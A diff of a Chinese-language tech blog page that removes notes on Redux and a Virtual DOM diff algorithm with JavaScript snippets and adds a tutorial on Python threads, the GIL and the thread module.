+<h4 id="4-Python线程和GIL"><a href="#4-Python线程和GIL" class="headerlink" title="4. Python线程和GIL"></a>4. Python线程和GIL</h4><h5 id="4-1-全局解释锁（GIL）"><a href="#4-1-全局解释锁（GIL）" class="headerlink" title="4.1  全局解释锁（GIL）"></a>4.1  全局解释锁（GIL）</h5><p>​    Python代码的执行是由Python虚拟机（也叫解释器主循环）来控制，Python在设计之初就考虑到要在主循环中，同时只有一个线程在执行，就像单CPU系统中运行多个进程那样，内存中可以存放多个程序，但任意时刻，只有一个程序在CPU中运行。同样地道理，虽然Python解释器中可以运行多个线程，但在任意时刻，只有一个线程在解释器中运行。</p>
+<p>​    对Python虚拟机的访问由全局解释器锁(GIL)来控制，正是这个锁能保证同一时刻只有一个线程在运行。在多线程的环境下，Python虚拟机按以下方式执行：</p>
 <ol>
-<li>需要回调通知state (等同于回调参数) -&gt; action</li>
-<li>需要根据回调处理 (等同于父级方法) -&gt; reducer</li>
-<li><p>需要state (等同于总状态) -&gt; store</p>
-<p>对Redux来说只有这三个要素：</p>
+<li><p>设置GIL</p>
 </li>
-<li>action是纯声明式的数据结构，只提供事件的所有要素，不提供逻辑</li>
-<li>reducer是一个匹配函数，action的发送是全局的：所有的reducer都可以捕捉到并匹配与自己相关与否，相关就拿走action中的要素进行逻辑处理，修改store中的状态，不相关就不对state做处理原样返回。</li>
-<li><p>store负责存储状态并可以被react api回调，发布action.当然一般不会直接把两个库拿来用，还有一个binding叫react-redux, 提供一个Provider和connect。</p>
-<p>很多人其实看懂了redux卡在这里。</p>
+<li><p>切换到一个线程去运行</p>
 </li>
-<li>Provider是一个普通组件，可以作为顶层app的分发点，它只需要store属性就可以了。它会将state分发给所有被connect的组件，不管它在哪里，被嵌套多少层。</li>
-<li>connect是真正的重点，它是一个科里化函数，意思是先接受两个参数（数据绑定mapStateToProps和事件绑定mapDispatchToProps），再接受一个参数（将要绑定的组件本身）：mapStateToProps：构建好Redux系统的时候，它会被自动初始化，但是你的React组件并不知道它的存在，因此你需要分拣出你需要的Redux状态，所以你需要绑定一个函数，它的参数是state，简单返回你关心的几个值。</li>
-</ol>
+<li><p>运行</p>
+<p>a.指定数量的字节码指令，或者，</p>
+<p>b.线程主动让出控制（可以调用time.sleep(0)）</p>
+</li>
+<li><p>把线程设置为睡眠状态</p>
+</li>
+<li><p>解锁GIL</p>
+</li>
+<li><p>再次重复以上所有步骤</p>
 </li>
 </ol>
-<p>mapDispatchToProps：声明好的action作为回调，也可以被注入到组件里，就是通过这个函数，它的参数是dispatch，通过redux的辅助方法bindActionCreator绑定所有action以及参数的dispatch，就可以作为属性在组件里面作为函数简单使用了，不需要手动dispatch。这个mapDispatchToProps是可选的，如果不传这个参数redux会简单把dispatch作为属性注入给组件，可以手动当做store.dispatch使用。这也是为什么要科里化的原因。</p>
-<p>做好以上流程Redux和React就可以工作了。简单地说就是：</p>
-<ol>
-<li>顶层分发状态，让React组件被动地渲染。</li>
-<li>监听事件，事件有权利回到所有状态顶层影响状态。</li>
-</ol>
-<h2 id="8-虚拟dom"><a href="#8-虚拟dom" class="headerlink" title="==8. 虚拟dom=="></a>==8. 虚拟dom==</h2><p>相关链接：<a href="https://github.com/livoras/blog/issues/13" target="_blank" rel="external">深度剖析：如何实现一个 Virtual DOM 算法</a></p>
-<p>源码网址： <a href="https://github.com/livoras/simple-virtual-dom" target="_blank" rel="external">GitHub</a></p>
-<p>目录：</p>
-<ul>
-<li>对前端应用状态管理思考</li>
-<li>Virtual DOM 算法</li>
-<li>算法实现<ul>
-<li>步骤一：用JS对象模拟DOM树</li>
-<li>步骤二：比较两棵虚拟DOM树的差异</li>
-<li>步骤三：把差异应用到真正的DOM树上</li>
-</ul>
-</li>
-<li>结语</li>
-<li>References</li>
-</ul>
-<h3 id="1-对前端应用状态管理的思考"><a href="#1-对前端应用状态管理的思考" class="headerlink" title="1 对前端应用状态管理的思考"></a>1 对前端应用状态管理的思考</h3><p>假如现在你需要写一个像下面一样的表格的应用程序，这个表格可以根据不同的字段进行升序或者降序的展示。</p>
-<p><img src="https://pic3.zhimg.com/50/0c1ee6d9a303d5a43b0fa4b3fc82f3a2_hd.png" alt="image"></p>
-<p>这个应用程序看起来很简单，你可以想出好几种不同的方式来写。最容易想到的可能是，在你的 JavaScript 代码里面存储这样的数据：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> sortKey = <span class="string">"new"</span> <span class="comment">// 排序的字段，新增（new）、取消（cancel）、净关注（gain）、累积（cumulate）人数</span></div><div class="line"><span class="keyword">var</span> sortType = <span class="number">1</span> <span class="comment">// 升序还是逆序</span></div><div class="line"><span class="keyword">var</span> data = [&#123;...&#125;, &#123;...&#125;, &#123;..&#125;, ..] <span class="comment">// 表格数据</span></div></pre></td></tr></table></figure>
-<p>用三个字段分别存储当前排序的字段、排序方向、还有表格数据；然后给表格头部加点击事件：当用户点击特定的字段的时候，根据上面几个字段存储的内容来对内容进行排序，然后用 JS 或者 jQuery 操作 DOM，更新页面的排序状态（表头的那几个箭头表示当前排序状态，也需要更新）和表格内容。</p>
-<p>这样做会导致的后果就是，随着应用程序越来越复杂，需要在JS里面维护的字段也越来越多，需要监听事件和在事件回调用更新页面的DOM操作也越来越多，应用程序会变得非常难维护。后来人们使用了 MVC、MVP 的架构模式，希望能从代码组织方式来降低维护这种复杂应用程序的难度。但是 MVC 架构没办法减少你所维护的状态，也没有降低状态更新你需要对页面的更新操作（前端来说就是DOM操作），你需要操作的DOM还是需要操作，只是换了个地方。</p>
-<p>既然状态改变了要操作相应的DOM元素，为什么不做一个东西可以让视图和状态进行绑定，状态变更了视图自动变更，就不用手动更新页面了。这就是后来人们想出了 MVVM 模式，只要在模版中声明视图组件是和什么状态进行绑定的，双向绑定引擎就会在状态更新的时候自动更新视图（关于MV*模式的内容，可以看这篇介绍）。</p>
-<p>MVVM 可以很好的降低我们维护状态 -&gt; 视图的复杂程度（大大减少代码中的视图更新逻辑）。但是这不是唯一的办法，还有一个非常直观的方法，可以大大降低视图更新的操作：一旦状态发生了变化，就用模版引擎重新渲染整个视图，然后用新的视图更换掉旧的视图。就像上面的表格，当用户点击的时候，还是在JS里面更新状态，但是页面更新就不用手动操作 DOM 了，直接把整个表格用模版引擎重新渲染一遍，然后设置一下innerHTML就完事了。</p>
-<p>听到这样的做法，经验丰富的你一定第一时间意识这样的做法会导致很多的问题。最大的问题就是这样做会很慢，因为即使一个小小的状态变更都要重新构造整棵 DOM，性价比太低；而且这样做的话，input和textarea的会失去原有的焦点。最后的结论会是：对于局部的小视图的更新，没有问题（Backbone就是这么干的）；但是对于大型视图，如全局应用状态变更的时候，需要更新页面较多局部视图的时候，这样的做法不可取。</p>
-<p>但是这里要明白和记住这种做法，因为后面你会发现，其实 Virtual DOM 就是这么做的，只是加了一些特别的步骤来避免了整棵 DOM 树变更。</p>
-<p>另外一点需要注意的就是，上面提供的几种方法，其实都在解决同一个问题：维护状态，更新视图。在一般的应用当中，如果能够很好方案来应对这个问题，那么就几乎降低了大部分复杂性。</p>
-<h3 id="2-Virtual-DOM算法"><a href="#2-Virtual-DOM算法" class="headerlink" title="2. Virtual DOM算法"></a>2. Virtual DOM算法</h3><p>DOM是很慢的。如果我们把一个简单的div元素的属性都打印出来，你会看到：</p>
-<p><img src="https://pic4.zhimg.com/50/d5cda33e28d83ba12368202645f9e35b_hd.png" alt="image"></p>
-<p>而这仅仅是第一层。真正的 DOM 元素非常庞大，这是因为标准就是这么设计的。而且操作它们的时候你要小心翼翼，轻微的触碰可能就会导致页面重排，这可是杀死性能的罪魁祸首。</p>
-<p>相对于 DOM 对象，原生的 JavaScript 对象处理起来更快，而且更简单。DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> element = &#123;</div><div class="line">  tagName: <span class="string">'ul'</span>, <span class="comment">// 节点标签名</span></div><div class="line">  props: &#123; <span class="comment">// DOM的属性，用一个对象存储键值对</span></div><div class="line">    id: <span class="string">'list'</span></div><div class="line">  &#125;,</div><div class="line">  children: [ <span class="comment">// 该节点的子节点</span></div><div class="line">    &#123;<span class="attr">tagName</span>: <span class="string">'li'</span>, <span class="attr">props</span>: &#123;<span class="attr">class</span>: <span class="string">'item'</span>&#125;, <span class="attr">children</span>: [<span class="string">"Item 1"</span>]&#125;,</div><div class="line">    &#123;<span class="attr">tagName</span>: <span class="string">'li'</span>, <span class="attr">props</span>: &#123;<span class="attr">class</span>: <span class="string">'item'</span>&#125;, <span class="attr">children</span>: [<span class="string">"Item 2"</span>]&#125;,</div><div class="line">    &#123;<span class="attr">tagName</span>: <span class="string">'li'</span>, <span class="attr">props</span>: &#123;<span class="attr">class</span>: <span class="string">'item'</span>&#125;, <span class="attr">children</span>: [<span class="string">"Item 3"</span>]&#125;,</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>上面对应的HTML写法是：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">'list'</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">'item'</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">'item'</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">'item'</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>既然原来 DOM 树的信息都可以用 JavaScript 对象来表示，反过来，你就可以根据这个用 JavaScript 对象表示的树结构来构建一棵真正的DOM树。</p>
-<p>之前的章节所说的，状态变更-&gt;重新渲染整个视图的方式可以稍微修改一下：用 JavaScript 对象表示 DOM 信息和结构，当状态变更的时候，重新渲染这个 JavaScript 的对象结构。当然这样做其实没什么卵用，因为真正的页面其实没有改变。</p>
-<p>但是可以用新渲染的对象树去和旧的树进行对比，记录这两棵树差异。记录下来的不同就是我们需要对页面真正的 DOM 操作，然后把它们应用在真正的 DOM 树上，页面就变更了。这样就可以做到：视图的结构确实是整个全新渲染了，但是最后操作DOM的时候确实只变更有不同的地方。</p>
-<p>这就是所谓的 Virtual DOM 算法。包括几个步骤：</p>
-<ol>
-<li>==用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档书中==</li>
-<li>==当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异==</li>
-<li>==把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了==</li>
-</ol>
-<p>Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。</p>
-<h3 id="3-算法实现"><a href="#3-算法实现" class="headerlink" title="3. 算法实现"></a>3. 算法实现</h3><h4 id="3-1-步骤一：用JS对象模拟DOM树"><a href="#3-1-步骤一：用JS对象模拟DOM树" class="headerlink" title="3.1 步骤一：用JS对象模拟DOM树"></a>3.1 步骤一：用JS对象模拟DOM树</h4><p>用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点：</p>
-<p>element.js</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Element</span> (<span class="params">tagName, props, children</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.tagName = tagName</div><div class="line">  <span class="keyword">this</span>.props = props</div><div class="line">  <span class="keyword">this</span>.children = children</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">tagName, props, children</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Element(tagName, props, children)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>例如上面的 DOM 结构就可以简单的表示：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> el = <span class="built_in">require</span>(<span class="string">'./element'</span>)</div><div class="line"></div><div class="line"><span class="keyword">var</span> ul = el(<span class="string">'ul'</span>, &#123;<span class="attr">id</span>: <span class="string">'list'</span>&#125;, [</div><div class="line">  el(<span class="string">'li'</span>, &#123;<span class="attr">class</span>: <span class="string">'item'</span>&#125;, [<span class="string">'Item 1'</span>]),</div><div class="line">  el(<span class="string">'li'</span>, &#123;<span class="attr">class</span>: <span class="string">'item'</span>&#125;, [<span class="string">'Item 2'</span>]),</div><div class="line">  el(<span class="string">'li'</span>, &#123;<span class="attr">class</span>: <span class="string">'item'</span>&#125;, [<span class="string">'Item 3'</span>])</div><div class="line">])</div></pre></td></tr></table></figure>
-<p>现在ul只是一个 JavaScript 对象表示的 DOM 结构，页面上并没有这个结构。我们可以根据这个ul构建真正的:</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Element.prototype.render = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="keyword">this</span>.tagName) <span class="comment">// 根据tagName构建</span></div><div class="line">  <span class="keyword">var</span> props = <span class="keyword">this</span>.props</div><div class="line"></div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> propName <span class="keyword">in</span> props) &#123; <span class="comment">// 设置节点的DOM属性</span></div><div class="line">    <span class="keyword">var</span> propValue = props[propName]</div><div class="line">    el.setAttribute(propName, propValue)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> children = <span class="keyword">this</span>.children || []</div><div class="line"></div><div class="line">  children.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">child</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> childEl = (child <span class="keyword">instanceof</span> Element)</div><div class="line">      ? child.render() <span class="comment">// 如果子节点也是虚拟DOM，递归构建DOM节点</span></div><div class="line">      : <span class="built_in">document</span>.createTextNode(child) <span class="comment">// 如果字符串，只构建文本节点</span></div><div class="line">    el.appendChild(childEl)</div><div class="line">  &#125;)</div><div class="line"></div><div class="line">  <span class="keyword">return</span> el</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ulRoot = ul.render()</div><div class="line"><span class="built_in">document</span>.body.appendChild(ulRoot)</div></pre></td></tr></table></figure>
-<p>上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的ul的DOM结构：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;ul id=<span class="string">'list'</span>&gt;</div><div class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">'item'</span>&gt;Item <span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></div><div class="line"><span class="regexp">  &lt;li class='item'&gt;Item 2&lt;/</span>li&gt;</div><div class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">'item'</span>&gt;Item <span class="number">3</span>&lt;<span class="regexp">/li&gt;</span></div><div class="line"><span class="regexp">&lt;/u</span>l&gt;</div></pre></td></tr></table></figure>
-<h4 id="3-2-步骤二：比较两棵虚拟DOM树的差异"><a href="#3-2-步骤二：比较两棵虚拟DOM树的差异" class="headerlink" title="3.2 步骤二：比较两棵虚拟DOM树的差异"></a>3.2 步骤二：比较两棵虚拟DOM树的差异</h4><p>正如你所预料的，比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓的 Virtual DOM 的 diff 算法。两个树的完全的 diff 算法是一个时间复杂度为 O(n^3) 的问题。但是在前端当中，你很少会跨越层级地移动DOM元素。所以 Virtual DOM 只会对同一个层级的元素进行对比：</p>
-<p><img src="https://pic2.zhimg.com/50/6d64b0b7889e7f020bb020aea5947a09_hd.png" alt="image"></p>
-<p>上面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比。这样算法复杂度就可以达到 O(n)。</p>
-<h5 id="3-2-1-深度优先遍历，记录差异"><a href="#3-2-1-深度优先遍历，记录差异" class="headerlink" title="3.2.1 深度优先遍历，记录差异"></a>3.2.1 深度优先遍历，记录差异</h5><p>在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记：</p>
-<p><img src="https://pic2.zhimg.com/50/c4ba535164d29fd46383d19512c37349_hd.png" alt="image"></p>
-<p>在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// diff 函数，对比两棵树</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">diff</span> (<span class="params">oldTree, newTree</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> index = <span class="number">0</span> <span class="comment">// 当前节点的标志</span></div><div class="line">  <span class="keyword">var</span> patches = &#123;&#125; <span class="comment">// 用来记录每个节点差异的对象</span></div><div class="line">  dfsWalk(oldTree, newTree, index, patches)</div><div class="line">  <span class="keyword">return</span> patches</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 对两棵树进行深度优先遍历</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">dfsWalk</span> (<span class="params">oldNode, newNode, index, patches</span>) </span>&#123;</div><div class="line">  <span class="comment">// 对比oldNode和newNode的不同，记录下来</span></div><div class="line">  patches[index] = [...]</div><div class="line"></div><div class="line">  diffChildren(oldNode.children, newNode.children, index, patches)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 遍历子节点</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">diffChildren</span> (<span class="params">oldChildren, newChildren, index, patches</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> leftNode = <span class="literal">null</span></div><div class="line">  <span class="keyword">var</span> currentNodeIndex = index</div><div class="line">  oldChildren.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">child, i</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> newChild = newChildren[i]</div><div class="line">    currentNodeIndex = (leftNode &amp;&amp; leftNode.count) <span class="comment">// 计算节点的标识</span></div><div class="line">      ? currentNodeIndex + leftNode.count + <span class="number">1</span></div><div class="line">      : currentNodeIndex + <span class="number">1</span></div><div class="line">    dfsWalk(child, newChild, currentNodeIndex, patches) <span class="comment">// 深度遍历子节点</span></div><div class="line">    leftNode = child</div><div class="line">  &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>例如，上面的div和新的div有差异，当前的标记是0，那么：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">patches[<span class="number">0</span>] = [&#123;difference&#125;, &#123;difference&#125;, ...] <span class="comment">// 用数组存储新旧节点的不同</span></div></pre></td></tr></table></figure>
-<h5 id="3-2-2-差异类型"><a href="#3-2-2-差异类型" class="headerlink" title="3.2.2 差异类型"></a>3.2.2 差异类型</h5><p>上面说的节点的差异指的是什么呢？对 DOM 操作可能会：</p>
-<ol>
-<li>替换掉原来的节点，例如把上面的div换成了section</li>
-<li>移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换</li>
-<li>修改了节点的属性</li>
-<li>对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。</li>
-</ol>
-<p>所以我们定义了几种差异类型：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> REPLACE = <span class="number">0</span></div><div class="line"><span class="keyword">var</span> REORDER = <span class="number">1</span></div><div class="line"><span class="keyword">var</span> PROPS = <span class="number">2</span></div><div class="line"><span class="keyword">var</span> TEXT = <span class="number">3</span></div></pre></td></tr></table></figure>
-<p>对于节点替换，很简单。判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">patches[<span class="number">0</span>] = [&#123;</div><div class="line">  type: REPALCE,</div><div class="line">  node: newNode <span class="comment">// el('section', props, children)</span></div><div class="line">&#125;]</div></pre></td></tr></table></figure>
+<p>​       在调用外部代码（如C/C++扩展函数）的时候，GIL将会被锁定，直到这个函数结束为止（因为在这期间内有Python的字节码被运行，所以不会做线程切换），编写扩展的程序员可以主动解锁GIL。</p>
+<p>​    对于I/O密集型的Python程序比计算密集型程序更能充分利用多线程环境的好处。这是因为，对所有面向I/O的（会调用内建的OS的C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其它的线程在这个线程等待I/O的时候运行。如果某线程并未使用很多I/O操作，它会在自己的时间片内一直占用处理器和GIL。</p>
+<p>​        <a href="https://www.cnblogs.com/ybjourney/p/6429715.html" target="_blank" rel="external">GIL的一点源码</a></p>
+<h5 id="4-2-退出线程"><a href="#4-2-退出线程" class="headerlink" title="4.2  退出线程"></a>4.2  退出线程</h5><p>​    当一个线程结束计算，它就退出了。线程可以调用thread.exit()之类的退出函数，也可以使用Python退出进程的标准方法，如sys.exit()或抛出一个SystemExit异常等。但是，我们不可以直接kill掉一个进程。</p>
+<p>​    有两个和线程相关的模块thread和threading，但不建议直接使用thread模块，显而易见的一个原因是当主进程退出的时候，所有其它线程没有被清除就退出了。但另一个模块threading就能确保所有”重要的”子线程都退出后，进程才会结束。</p>
+<p>​    而且，主线程应当作为一个好的管理者，它要了解每个线程都要做些什么事，线程都需要什么数据和参数，以及在线程结束的时候，它们都提供了什么结果。这样，主线程就可以把各个线程的结果组合成一个有意义的最后结果。</p>
+<p>​    实际上Python提供了几个用于多线程编程的模块，包括thread,threading和Queue等。thread和threading模块允许程序员创建和管理线程。thread模块提供了基本的线程和锁的支持，而threading提供了更高级别，功能更强的线程管理功能。Queue模块允许用户创建一个用于多个线程之间共享数据的队列数据结构。</p>
+<h5 id="4-3-没有线程支持的情况"><a href="#4-3-没有线程支持的情况" class="headerlink" title="4.3 没有线程支持的情况"></a>4.3 没有线程支持的情况</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#onethr.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep,ctime</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop0</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'start loop0 at:'</span>,ctime())</div><div class="line">    sleep(<span class="number">4</span>)</div><div class="line">    print(<span class="string">'loop0 done at:'</span>,ctime())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop1</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'start loop1 at:'</span>, ctime())</div><div class="line">    sleep(<span class="number">2</span>)</div><div class="line">    print(<span class="string">'loop1 done at:'</span>, ctime())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'starting at:'</span>, ctime())</div><div class="line">    loop0()</div><div class="line">    loop1()</div><div class="line">    print(<span class="string">'all done at:'</span>,ctime())</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>​    我们会使用time.sleep()函数来演示线程是怎样工作的。time.sleep()需要一个浮点型参数，来指定”睡眠”的时间(单位秒)。这就意味着，程序的运行会被挂起指定的时间。    </p>
+<p>​    我们要创建两个”计时循环”。一个睡眠4秒钟，一个睡眠2秒钟，分别是loop0()和loop1().（我们命名为”loop0”和”loop1”表示我们将有一个循环的序列）。    </p>
+<p>​    如果我们在一个进程或者一个线程中，顺序的执行loop0()和loop1()，那运行的总时间为6秒。在启动loop0(),loop1(),和其它的代码时，也要花去一些时间，所以，我们看到的总时间也有可能会是7秒钟。</p>
+<p>​    假定loop0和loop1里做的不是睡眠，而是各自独立的，不相关的运算，各自的运算结果到最后将会汇总成一个最终的结果。这时，如果能让这些计算并行执行的话，那这样就会减少总的运行时间，这就是多线程编程的前提条件。</p>
+<h5 id="4-4-避免使用thread模块"><a href="#4-4-避免使用thread模块" class="headerlink" title="4.4 避免使用thread模块"></a>4.4 避免使用thread模块</h5><p>​    不建议使用thread模块，首先是因为更高级别的threading模块更为先进，对线程的支持更为完善，而且使用thread模块里的属性有可能会与threading模块出现冲突。其次，低级别的thread模块的同步原语很少（实际上只有一个），而threading模块则有很多。</p>
+<p>​    另一个不要使用thread原因是，对于你的进程什么时候应该结束完全没有控制，当主线程结束时，所有的线程都会被强制结束掉，没有警告也不会有正常的清除工作。而threading模块能确保<strong><em>重要的</em></strong>子线程退出后进程才退出。</p>
+<p>​    只建议那些有经验的专家想访问线程的底层结构的时候，才使用thread模块。</p>
+<h4 id="5-thread模块和threading模块"><a href="#5-thread模块和threading模块" class="headerlink" title="5. thread模块和threading模块"></a>5. thread模块和threading模块</h4><h5 id="5-1-thread模块"><a href="#5-1-thread模块" class="headerlink" title="5.1 thread模块"></a>5.1 thread模块</h5><p>​    thread模块除了产生线程外，thread模块也提供了基本的同步数据结构锁对象(lock object,也叫原语锁，简单锁，互斥锁，互斥量，二值信号量)，同步原语与线程的管理是密不可分的。</p>
+<p>​    下表列出常用的线程函数以及LockType类型的锁对象的方法。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">thread模块函数</td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">start_new_thread(function,args,kwargs=None)</td>
+<td>产生一个新的线程，在新线程中用指定的参数和可选的kwargs来调用这个函数。</td>
+</tr>
+<tr>
+<td style="text-align:left">allocate_lock()</td>
+<td>分配一个LockType类型的锁对象</td>
+</tr>
+<tr>
+<td style="text-align:left">exit()</td>
+<td>让线程退出</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>LockType类型锁对象方法</strong></td>
+<td></td>
+</tr>
+<tr>
+<td style="text-align:left">acquire(wait=None)</td>
+<td>尝试获得锁对象</td>
+</tr>
+<tr>
+<td style="text-align:left">locked()</td>
+<td>如果获取了锁对象返回True,否则返回False</td>
+</tr>
+<tr>
+<td style="text-align:left">release()</td>
+<td>释放锁</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+</tr>
+</tbody>
+</table>
